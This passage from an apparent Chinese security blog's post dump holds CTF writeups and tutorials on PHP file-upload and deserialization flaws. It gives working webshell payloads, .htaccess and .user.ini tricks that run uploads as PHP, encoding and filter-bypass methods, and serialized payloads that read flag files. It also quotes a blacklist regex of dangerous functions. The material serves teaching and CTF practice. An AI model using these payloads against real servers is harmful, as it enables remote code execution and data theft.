将a改为b，sql改为flag_Y0U_c4nt_GUESS，将sqlite_master改为flag_ThE_C0lumn table_name=b as select [flag_ThE_C0lumn] as[&amp;columns[0][name]=]from flag_Y0U_c4nt_GUESS;&amp;columns[0][type]=INTEGER flag 1flag&#123;486756b1-d23c-4236-b44c-cd43640098c6&#125;","categories":[{"name":"比赛writeup","slug":"比赛writeup","permalink":"https://flag2020.top/categories/%E6%AF%94%E8%B5%9Bwriteup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://flag2020.top/tags/writeup/"}]},{"title":"文件上传漏洞","slug":"文件上传漏洞","date":"2020-10-16T16:00:00.000Z","updated":"2020-11-11T15:20:55.263Z","comments":true,"path":"2020/10/17/文件上传漏洞/","link":"","permalink":"https://flag2020.top/2020/10/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中，再通过url去访问以执行代码。 通常造成文件上传漏洞的原因是：对于上传文件的后缀名（扩展名），类型，以及内容没有做好严格的限制等等一些原因。 文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。 这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。","text":"一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中，再通过url去访问以执行代码。 通常造成文件上传漏洞的原因是：对于上传文件的后缀名（扩展名），类型，以及内容没有做好严格的限制等等一些原因。 文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。 这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。 文件上传漏洞.htaccess任意文件解析 .htaccess可以帮我们实现：网页301重定向，自定义404错误页面，改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、封禁特定IP地址的用户，只允许特定IP地址的用户，以及使用其他文件作为index文件配置默认文档等功能。 当服务器是上传使用的是黑名单机制，但是锁死了不给上传php后缀的文件，我们可以使用.htaccess文件重新配置当前文件的解析后缀为其他后缀绕过导致其他后缀的文件被解析为php。导致远程代码执行。 1AddType application&#x2F;x-httpd-php .aaa .htaccess文件配置信息,这里将后缀为.aaa的文件均解析为php文件 短标签绕过假设&lt;?php 被被过滤，同时PHP版本为5可以使用段标签绕过。 JS风格 1&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt; 短标签风格 1&lt;?=phpinfo();?&gt; &lt;?=?&gt;与&lt;?php echo ....?&gt;等效 ASP风格 1&lt;% phpinfo();%&gt; 官方默认风格 1&lt;?php phpinfo(); ?&gt; 特殊编码绕过(UTF-7)如果程序过滤了所有标签形式、或者说过滤了&lt;?而且PHP是在PHP7以上版本（PHP7已经将其他标签形式过淘汰，仅剩下&lt;?php形式），这时候可以使用.htaccess解码对应的文件，例如可以使用UTF-7进行解码：(https://www.novel.tools/encode/UTF-7这个网站可以编码和解码UTF-7） .htaccess 1234AddType application&#x2F;x-httpd-php .aaaphp_flag display_errors onphp_flag zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot; 1.aaa 1+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4- 双写绕过假如对上传文件的内容中的php，POST，eval替换为空，那么我们可以用这样的方式绕过。 12&lt;?pphphp@eevalval($_PPOSTOST[&#x27;cmd&#x27;]); 123&lt;?php@eval($_POST[&#x27;cmd&#x27;]); .user.ini绕过假如.htaccess被过滤了，不允许上传，而上传目录下有一个php文件，则可以使用.user.ini将我们制定文件包含到我们目录下的所有PHP文件导致远程代码执行。 1.aaa 12&lt;?php@eval($_POST[&#x27;cmd&#x27;]); .user.ini 1auto_prepend_file&#x3D;1.aaa 加载其它php文件的时候，会先加载.user.ini里的1.aaa .htaccess文件换行绕过上传.htaccess文件时候发现文件内容被过滤。可以使用换行绕过的方法绕过过滤。 .htaccess支持换行编写所以使用换行可以直接上传成功并解析。 12AddType appli\\cation&#x2F;x-httpd-php .aaa 过滤掉application，则使用换行绕过 文件包含解码Base64 .htaccess 12AddType application&#x2F;x-httpd-php .aaaphp_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.aaa&quot; 动态拼接函数绕过函数过滤对危险函数进行了过滤，不允许上传，则可以使用aiisc码拼接动态构造函数来绕过。 使用脚本快速生成指定函数 123456&lt;?php$a = &quot;phpinfo&quot;;for($i=0;$i&lt;strlen($a);$i++)&#123; echo &quot;chr(&quot;.ord($a[$i]).&quot;).&quot;;&#125;?&gt; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111) 1.aaa 1234&lt;?php$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);$a();?&gt; 图片头绕过上传1.aaa，被检测到文件不是图片类型，则可以通过以下方法绕过，则有可能被识别为图片，绕过检测。 XMB文件头绕过12#define test_width 16#define test_height 7 1.aaa 123456#define test_width 16#define test_height 7&lt;?php$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);$a();?&gt; GIF89a1GIF89a 1.aaa 12345GIF89a&lt;?php$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);$a();?&gt; 题目upload2发现不能上传php文件，且文件内容不能使用官方默认风格(上传提示：Can’t upload php file)，所以尝试使用其它标签绕过 .htaccess 1AddType application&#x2F;x-httpd-php .aaa 1.aaa 1&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt; 在根目录下找到flag。 或者 cat /flag upload3 .htaccess 1AddType application&#x2F;x-httpd-php .aaa 1.aaa 12&lt;?php@eval($_POST[&#39;cmd&#39;]); 发现php，eval，POST被替换为空，使用双写绕过。 .htaccess 1AddType application&#x2F;x-httpd-pphphp .aaa 1.aaa 12&lt;?pphphp@eevalval($_PPOSTOST[&#39;cmd&#39;]); upload4 .htaccess 1AddType application&#x2F;x-httpd-php .aaa 1.aaa 12&lt;?php@eval($_POST[&#39;cmd&#39;]); 发现没有上传。上传test.php和1.jpg（不是真的jpg文件）也都失败，尝试使用.user.ini绕过，结果提示：内容不能有file。 几次尝试后发现，它对文件内容进行检查，不能含有&lt;?，且无法用其它标签绕过。 尝试使用特殊编码绕过，上传.htaccess和1.aaa .htaccess 1234AddType application&#x2F;x-httpd-php .aaaphp_flag display_errors onphp_flag zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot; 1.aaa 1+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4- 在根目录下找到flag。 找到flag之后查看php版本为：7.0.33 尝试发现： 由于版本为7.0以上且过滤掉&lt;?，所以无法使用其它标签绕过。 upload6 .htaccess 1AddType application&#x2F;x-httpd-php .aaa 提示：内容不能有application 尝试使用.htaccess文件换行绕过。 .htaccess 12AddType appli\\cation&#x2F;x-httpd-php .aaa 1.aaa 12&lt;?php@eval($_POST[&#39;cmd&#39;]); upload7 .htaccess 1AddType application&#x2F;x-httpd-php .aaa 1.aaa 12&lt;?php@eval($_POST[&#39;cmd&#39;]); 上传1.aaa 提示：不能含有危险函数！ 使用burp suite抓包看看，发现eval和POST被过滤了。 尝试使用动态拼接函数绕过函数过滤，发现可以成功上传，然后访问该文件就可以得到flag。 1.aaa 123&lt;?php$a &#x3D; chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$a(&#39;cat &#x2F;flag&#39;); 123&lt;?php$a = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);echo $a; 输出：system PS： ctf-wscan下载地址：https://codeload.github.com/kingkaki/ctf-wscan/zip/master 做题前可以先扫扫看有没有备份文件 像robots.txt 、www.zip。 使用扫描器扫描发现存在备份文件 下载备份文件 把.index.php.swp放到linux下使用vim -r恢复 1vim -r index.php.swp 得到源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php//设置上传目录define(&quot;UPLOAD_PATH&quot;, &quot;../upload&quot;);function deldot($s)&#123; for($i=strlen($s)-1;$i&gt;0;$i--)&#123; $c=substr($s,$i,1); if($i == strlen($s)-1 and $c != &#x27;.&#x27;)&#123; return $s; &#125; if($c != &#x27;.&#x27;)&#123; return substr($s,0,$i+1); &#125; &#125;&#125;$is_upload=false;$msg=null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext=array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name=trim($_FILES[&#x27;pic&#x27;][&#x27;name&#x27;]); $file_name=deldot($file_name);//删除文件名末尾的点 $file_ext=strrchr($file_name, &#x27;.&#x27;); $file_ext=strtolower($file_ext); //转换为小写 $file_ext=str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext=trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file=$_FILES[&#x27;pic&#x27;][&#x27;tmp_name&#x27;]; $img_path=UPLOAD_PATH.&#x27;/&#x27;.$file_name; if(preg_match(&quot;/(phpinfo|system\\(|eval\\(|file_put_contents|file_get_contents|passthru|exec\\(|chroot|scandir|proc_open|delfolder|unlink|mkdir|fopen|fread|fwrite|fputs|tmpfile|flock|chmod|delete|assert|_post|_get|_request|_file|create_function|array_walk|preg_replace|cookie)/Ui&quot;,file_get_contents($temp_file)))&#123; die(&quot;不能含有危险函数！&quot;); &#125; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload=true; echo &quot;上传成功&quot;.&quot;&lt;br&gt;&quot;; echo $img_path; &#125;else&#123; echo &#x27;上传出错！&#x27;; &#125; &#125;else&#123; echo &#x27;此文件不允许上传!&#x27;; &#125; &#125;else&#123; echo UPLOAD_PATH . &#x27;文件夹不存在,请重新上传！&#x27;; mkdir(UPLOAD_PATH,775,true); &#125;&#125;?&gt;","categories":[{"name":"信息安全","slug":"信息安全","permalink":"https://flag2020.top/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web","slug":"web","permalink":"https://flag2020.top/tags/web/"}]},{"title":"反序列化漏洞","slug":"反序列化漏洞","date":"2020-10-07T16:00:00.000Z","updated":"2020-11-11T15:23:22.458Z","comments":true,"path":"2020/10/08/反序列化漏洞/","link":"","permalink":"https://flag2020.top/2020/10/08/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 序列化 serialize() 将对象转变成一个字符串便于之后的传递与使用。 序列化会保存对象所有的变量，但是不会保存对象的方法。 反序列化 unserialize() 将序列化的结果恢复成对象。 反序列化一个对象，这个对象的类必须在反序列化之前定义，或者通过包含该类的定义或者使用 spl_autoload_register() (自动包含类)实现","text":"所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 序列化 serialize() 将对象转变成一个字符串便于之后的传递与使用。 序列化会保存对象所有的变量，但是不会保存对象的方法。 反序列化 unserialize() 将序列化的结果恢复成对象。 反序列化一个对象，这个对象的类必须在反序列化之前定义，或者通过包含该类的定义或者使用 spl_autoload_register() (自动包含类)实现 反序列化漏洞序列化和反序列化本身没有问题，但是如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。 php魔术方法 PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。 通常来说有一些PHP的魔法函数会导致反序列化漏洞，如： __construct 当一个对象创建时自动调用 __wakeup 使用unserialize()函数时会自动调用 __destruct 当对象被销毁时自动调用 (php绝大多数情况下会自动调用销毁对象) __toString 当一个对象被当作一个字符串被调用。 __sleep() 使用serialize()函数时触发 __call() 在对象上下文中调用不可访问的方法时触发 __callStatic() 在静态上下文中调用不可访问的方法时触发 __get() 用于从不可访问的属性读取数据 __set() 用于将数据写入不可访问的属性 __isset() 在不可访问的属性上调用isset()或empty()触发 __unset() 在不可访问的属性上使用unset()时触发 __toString() 把类当作字符串使用时触发,返回值需要为字符串 __invoke() 当脚本尝试将对象调用为函数时触发 12345678910111213141516171819202122232425262728293031&lt;?phpclass test &#123; public $varr1 = &quot;abc&quot;; public $varr2 = &quot;123&quot;; public function echoP() &#123; echo $this-&gt;varr1.&quot;&lt;br&gt;&quot;; &#125; public function __construct() &#123; echo &quot;__construct&lt;br&gt;&quot;; &#125; public function __destruct() &#123; echo &quot;__destruct&lt;br&gt;&quot;; &#125; public function __toString() &#123; return &quot;__toString&lt;br&gt;&quot;; &#125; public function __sleep() &#123; echo &quot;__sleep&lt;br&gt;&quot;; return array(&#x27;varr1&#x27;,&#x27;varr2&#x27;); &#125; public function __wakeup() &#123; echo&quot;__wakeup&lt;br&gt;&quot;; &#125;&#125;$obj = new test();//序列化对象，调用__construct()方法，输出__construct$obj-&gt;echoP(); //调用echoP()方法，输出&quot;abc&quot;echo $obj; //obj对象被当做字符串输出，调用__toString()方法，输出__toString$s = serialize($obj); //obj对象被序列化，调用__sleep()方法，输出__sleepecho unserialize($s); //$s首先会被反序列化，会调用__wakeup()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。 //脚本结束销毁对象（$obj和反序列化的$s）时，又会调用__destruct()方法（两次），输出__destruct（两次）?&gt; 反序列化漏洞例子： 12345678910&lt;?phpclass A&#123; var $test = &quot;kawhi&quot;; function __wakeup()&#123; echo $this-&gt;test; &#125;&#125;$a = $_GET[&#x27;a&#x27;];$b = unserialize($a);?&gt; 尝试构造序列化代码的时候插入xss 1234567891011&lt;?phpclass A&#123; var $test = &quot;&lt;img src=1 onerror=alert(1)&gt;&quot;; function __wakeup()&#123; echo $this-&gt;test; &#125;&#125;$c = new A();$c = serialize($c);echo $c;?&gt; 输出O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:28:&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;;&#125; O表示类型是object 1表示object对应的类的名字的长度为1 “A”表示类名 1表示对应变量的个数 s表示序列化后为字符串 4表示字符串的长度 “test&quot;表示表示变量名 s表示变量test的类型 28表示变量test的长度 &quot;&lt;img src=1 onerror=alert(1)&gt;&quot;表示变量test的值 如果__wakeup中不是echo()，而是eval()，那么就是任意代码执行，危害就更大了。 wakeup绕过一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数 例：在网站根目录下有两个文件flag.php和test.php test.php源码如下： 123456789101112131415161718192021222324252627&lt;?phpclass A&#123; public $file = __FILE__; function __construct($file)&#123; $this-&gt;file = $file; &#125; function __wakeup()&#123; if($this-&gt;file !== __FILE__)&#123; $this-&gt;file = __FILE__; &#125; &#125; function __destruct()&#123; highlight_file($this-&gt;file); &#125;&#125;if(isset($_REQUEST[&#x27;file&#x27;]))&#123; @unserialize($_REQUEST[&#x27;file&#x27;]);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 构造序列化代码 1234567891011&lt;?phpclass A&#123; function __construct()&#123; $this-&gt;file = &quot;flag.php&quot;; &#125;&#125;$a = new A;$b = serialize($a);print_r($b);?&gt; 输出： 1O:1:&quot;A&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 如果直接进行正常的反序列化的话，即 http://127.0.0.1/test.php/?file=O:1:&quot;A&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 页面没有其它变化，因为在使用unserialize()的时候自动调用__wakeup，将file替换为当前路径 php在解析属性长度的时候，若是出错 将O:1:&quot;A&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;改为 O:1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 它并不会终止，而是继续执行，但不会调用__wakeup() 然后在销毁对象的时候自动调用__destruct()函数，高亮显示flag.php exp 1http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; OC绕过对test.php进行修改 对传进来的file进行过滤 12345678910111213141516171819202122232425262728293031&lt;?phpclass A&#123; public $file = __FILE__; function __construct($file)&#123; $this-&gt;file = $file; &#125; function __wakeup()&#123; if($this-&gt;file !== __FILE__)&#123; $this-&gt;file = __FILE__; &#125; &#125; function __destruct()&#123; highlight_file($this-&gt;file); &#125;&#125;if(isset($_REQUEST[&#x27;file&#x27;]))&#123; $file = $_REQUEST[&#x27;file&#x27;]; if(preg_match(&#x27;/[OC]:\\d+:/i&#x27;, $file))&#123; die(&quot;hacking!!!&quot;); &#125; @unserialize($_REQUEST[&#x27;file&#x27;]);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 正则表达式中对file进行了过滤 当遇到 字母O或C 加上:，再加上一段数字和:，后面的 i 表示不区分大小写 时，则die掉。 该正则表达式匹配的部分为：O:1: 若在中间插入一些字符，就可以让它匹配不完全，这样就可以绕过正则匹配 对于数字 1 来说，+1 和 1 时一样的，这样就可以绕过 但在URL传参中，会进行解码，会把加号（+）变成空格，所以应用+的URL编码：%2b代替 即： O:%2b1: exp 1http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:%2b1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 私有属性绕过php中的访问类型（public，private，protected） public 公有修饰符，类中的成员没有访问限制，所有外部成员都可以访问（读和写）这个类成员（包括成员属性和成员方法）。 private 私有修饰符，被定义为private的成员，对于同一个类里的所有成员是可见的，即没有访问限制；但对于该类的外部代码时不允许改变甚至读操作的，对于该类的子类，也不能访问private修饰的成员。 protected 保护成员修饰符，被修饰为protected的成员不能被该类的外部代码访问。但是对于该类的子类有访问权限，可以进行属性、方法的读及写操作。 public 表示全局，类内部外部子类都可以访问；private 表示私有的，只有本类内部可以使用；protected 表示受保护的，只有本类或子类或父类中可以访问； 123456789&lt;?phpclass test&#123; public $test1 = &quot;hello&quot; private $test2 = &quot;hello&quot;; protected $test3 = &quot;hello&quot;;&#125;$test = new test();echo serialize($test); ?&gt; test类定义了三个不同类型(公有，私有，保护)，但是值相同的字符串，序列化输出的值不相同 private属性序列化为：%00类名%00变量名，对于test2来说，序列化后的长度则变为11 protected属性序列化为：%00*%00变量名，对于test3来说，序列化后的长度则变为8 %00是不可见字符 对test.php继续进行修改 将public改为private 12345678910111213141516171819202122232425262728293031&lt;?phpclass A&#123; private $file = __FILE__; function __construct($file)&#123; $this-&gt;file = $file; &#125; function __wakeup()&#123; if($this-&gt;file !== __FILE__)&#123; $this-&gt;file = __FILE__; &#125; &#125; function __destruct()&#123; highlight_file($this-&gt;file); &#125;&#125;if(isset($_REQUEST[&#x27;file&#x27;]))&#123; $file = $_REQUEST[&#x27;file&#x27;]; if(preg_match(&#x27;/[OC]:\\d+:/i&#x27;, $file))&#123; die(&quot;hacking!!!&quot;); &#125; @unserialize($_REQUEST[&#x27;file&#x27;]);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 序列化带private属性的file &#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 将file改为%00A%00file，对应的长度改为7 即： {s:7:”%00A%00file”;s:8:”flag.php”;} exp 1http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:%2b1:&quot;A&quot;:2:&#123;s:7:&quot;%00A%00file&quot;;s:8:&quot;flag.php&quot;;&#125; 字符串逃逸在网站根目录下有两个文件，test.php和flag.php test.php源码如下： 123456789101112131415161718192021&lt;?phperror_reporting(255);class A&#123; public $filename = __FILE__; public function __destruct()&#123; highlight_file($this-&gt;filename); &#125;&#125;function waf($s)&#123; return preg_replace(&#x27;/flag/i&#x27;, &#x27;index&#x27;, $s);&#125;if(isset($_REQUEST[&#x27;x&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;x&#x27;]))&#123; $a = [ 0 =&gt; $_REQUEST[&#x27;x&#x27;], 1 =&gt; &quot;1&quot; ]; @unserialize(waf(serialize($a)));&#125;else&#123; new A();&#125;?&gt; 构造payload： 首先要有个&quot;;使前面的字符串闭合 接下来是常规的序列化后的数组元素 i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125; 但在waf()函数中，对序列化后的$a进行替换，所以将s改为S，将flag.php改为十六进制的\\66\\6C\\61\\67\\2E\\70\\68\\70，即 i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125; 最后再加上&#125;使前面数组a的&#123;闭合 所以合起来是 &quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125; 12345678&lt;?php$a = [ 0 =&gt; &#x27;&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125;&#x27;, 1 =&gt; &#x27;1&#x27;];print_r(serialize($a));?&gt; 输出 a:2:&#123;i:0;s:65:&quot;&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125;&quot;;i:1;s:1:&quot;1&quot;;&#125; 所以该段字符串有65个字符 利用waf()函数将flag替换为index会增加一个字符，构造65个flag 1python -c print(&#x27;flag&#x27;*65) 将输出结果和前面的字符串拼接在一起，得到payload 1flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125; 附： 验证payload是否正确 123456789101112131415&lt;?phpfunction waf($a)&#123; return preg_replace(&#x27;/flag/&#x27;, &#x27;index&#x27;, $a);&#125;$a = [ 0 =&gt; &#x27;flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125;&#x27;, 1 =&gt; &#x27;1&#x27;];print_r(waf(serialize($a)));echo &quot;&lt;br&gt;&quot;;print_r(unserialize(waf(serialize($a))));?&gt; 输出结果： 12345678910a:2:&#123;i:0;s:325:&quot;indexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindex&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66\\6C\\61\\67\\2E\\70\\68\\70&quot;;&#125;&#125;&quot;;i:1;s:1:&quot;1&quot;;&#125;Array( [0] &#x3D;&gt; __PHP_Incomplete_Class Object ( [__PHP_Incomplete_Class_Name] &#x3D;&gt; A [filename] &#x3D;&gt; flag.php )) 1python -c &quot;print(len(&#x27;indexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindex&#x27;))&quot; 输出：325 phar反序列化(不太懂phar反序列化怎么用，这部分摘自https://paper.seebug.org/680/) phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。 注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。 1234567891011121314&lt;?php class TestObject &#123; &#125; @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 可以明显的看到meta-data是以序列化的形式存储的： 有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下： phar_test1.php 12345678910&lt;?php class TestObject &#123; public function __destruct() &#123; echo &#x27;Destruct called&#x27;; &#125; &#125; $filename = &#x27;phar://phar.phar/test.txt&#x27;; file_get_contents($filename); ?&gt; 其他函数当然也是可行的： phar_test2.php 1234567891011&lt;?php class TestObject &#123; public function __destruct() &#123; echo &#x27;Destruct called&#x27;; &#125; &#125; $filename = &#x27;phar://phar.phar/a_random_string&#x27;; file_exists($filename); //...... ?&gt; 当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，一些之前看起来“人畜无害”的函数也变得“暗藏杀机”，极大的拓展了攻击面。 题目unserialize11234567891011&lt;?php show_source(__FILE__); class XianZhi&#123; public $name; function __destruct()&#123; echo file_get_contents($this-&gt;name); &#125; &#125; unserialize($_GET[&#x27;a&#x27;]);?&gt; 构造序列化代码 12345678&lt;?phpclass XianZhi&#123; public $name = &#x27;/flag&#x27;;&#125;$a = new XianZhi();echo serialize($a);?&gt;//O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;/flag&quot;;&#125; unserialize2OC绕过、wake up绕过 1234567891011121314151617181920212223242526272829303132&lt;?phpclass Demo &#123; private $file = &#x27;index.php&#x27;; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != &#x27;index.php&#x27;) &#123; //the secret is in the f15g_1s_here.php $this-&gt;file = &#x27;index.php&#x27;; &#125; &#125;&#125;if (isset($_GET[&#x27;var&#x27;])) &#123; $var = base64_decode($_GET[&#x27;var&#x27;]); if (preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $var)) &#123; die(&#x27;stop hacking!&#x27;); &#125; else &#123; @unserialize($var); &#125;&#125; else &#123; highlight_file(&quot;index.php&quot;);&#125;?&gt; 这里首先有两个要绕过的点 第一个点是__wakeup()，因为这里正常反序列化会写死$this-&gt;ﬁle属性为 index.php，但是php存在这么一个漏洞（CVE-2016-7124），当实际对象不等于反序列化的对象数时候会绕过wakeup()。 第二个点是正则匹配，这里的正则匹配的意思是如果在var变量中存在O/C:数字(O:数字或者C:数字这样的形式)就die掉，这里匹配的是O:4，直接使用+号当做空格即可绕过，即O:+4即可绕过。 构造序列化代码 123456789101112131415&lt;?phpclass Demo &#123; private $file = &#x27;index.php&#x27;; public function __construct($file) &#123; $this-&gt;file = $file; &#125;&#125;$a = new Demo(&#x27;f15g_1s_here.php&#x27;);$a = serialize($a).&quot;\\n&quot;;$a = str_replace(&#x27;O:4&#x27;,&#x27;O:+4&#x27;,$a);$a = str_replace(&#x27;:1:&#x27;,&#x27;:2:&#x27;,$a);echo 